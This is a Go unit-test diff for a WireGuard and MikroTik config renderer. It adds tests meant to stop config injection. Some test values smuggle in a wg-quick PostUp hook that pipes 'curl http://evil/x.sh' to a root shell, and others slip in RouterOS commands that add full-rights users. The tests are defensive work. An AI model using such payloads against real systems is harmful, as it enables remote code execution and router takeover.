@@ -98,7 +98,7 @@ func TestRenderMikroTikConfig(t *testing.T) {
 	require.Contains(t, output, `/interface/wireguard/add name=wg-tikman private-key="PEERPRIV" listen-port=13231`)
 	require.Contains(t, output, "/ip/address/add address=10.88.0.5/24 interface=wg-tikman")
 	require.Contains(t, output, `public-key="SERVERPUB"`)
-	require.Contains(t, output, "endpoint-address=vpn.contoh.id endpoint-port=51820")
+	require.Contains(t, output, `endpoint-address="vpn.contoh.id" endpoint-port=51820`)
 	require.Contains(t, output, "allowed-address=10.88.0.0/24")
 	require.Contains(t, output, "persistent-keepalive=25s")
 	require.Contains(t, output, "chain=srcnat src-address=10.88.0.0/24 dst-address=10.10.10.0/24 action=masquerade")
@@ -179,4 +179,41 @@ func lineStartingWith(t *testing.T, output, prefix string) string {
 	}
 	t.Fatalf("no line starting with %q", prefix)
 	return ""
+}
+
+func TestRenderWGQuickConfigCannotBeMadeToRunACommand(t *testing.T) {
+	in := renderInput()
+	// wg-quick runs any PostUp it finds as root when the site brings the tunnel
+	// up, so a newline in a site name is not a formatting quirk.
+	in.SiteName = "Site A\n[Interface]\nPostUp = curl -s http://evil/x.sh | sh"
+
+	for _, line := range strings.Split(RenderWGQuickConfig(in), "\n") {
+		require.False(t, strings.HasPrefix(strings.TrimSpace(line), "PostUp = curl"),
+			"a site name must not be able to add a hook: %q", line)
+	}
+}
+
+func TestRenderMikroTikConfigCannotBeMadeToAddACommand(t *testing.T) {
+	in := renderInput()
+	in.EndpointHost = "1.2.3.4;/user/add name=hax password=hax group=full;"
+	in.SiteName = "Site A\n/user/add name=hax2 password=hax2 group=full"
+
+	output := strings.TrimSpace(RenderMikroTikConfig(in))
+	lines := strings.Split(output, "\n")
+
+	// One command per line, and the hostile values stay inside their quoted
+	// value rather than becoming commands of their own.
+	require.Len(t, lines, 9)
+	require.Contains(t, output, `endpoint-address="1.2.3.4;/user/add name=hax password=hax group=full;"`)
+	for _, line := range lines {
+		require.False(t, strings.HasPrefix(strings.TrimSpace(line), "/user/add"),
+			"no injected command may start a line: %q", line)
+	}
+}
+
+func TestMikrotikQuoteNeutralisesRouterOSSubstitution(t *testing.T) {
+	// RouterOS expands $name inside double quotes, which Go's %q leaves alone.
+	require.Equal(t, `"a\$b"`, mikrotikQuote("a$b"))
+	require.Equal(t, `"a\"b"`, mikrotikQuote(`a"b`))
+	require.Equal(t, `"ab"`, mikrotikQuote("a\nb"))
 }
